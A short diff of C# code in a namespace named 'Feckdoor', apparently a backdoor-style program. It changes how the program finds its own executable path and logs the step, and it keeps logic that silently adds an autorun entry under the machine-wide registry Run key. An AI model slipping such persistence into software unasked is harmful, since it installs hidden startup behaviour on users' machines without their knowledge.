@@ -174,11 +174,12 @@ namespace Feckdoor
 					return true;
 				}
 
-				string? exepath = Assembly.GetEntryAssembly()?.Location ?? Assembly.GetExecutingAssembly()?.Location;
-				if (exepath != null && Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
+				string? exepath = Application.ExecutablePath;
+				Log.Information("Executable path {path}.", exepath);
+				if (!string.IsNullOrWhiteSpace(exepath) && Registry.LocalMachine.OpenSubKey(autorunKey)?.GetValue(autorunValue) == null)
 				{
 					Registry.LocalMachine.CreateSubKey(autorunKey)?.SetValue(autorunValue, exepath);
-					Log.Information("Added autorun entry to {location}.", autorunPath);
+					Log.Information("Added autorun entry {executable} to {location}.", exepath, autorunPath);
 				}
 			}
 			catch (Exception e)
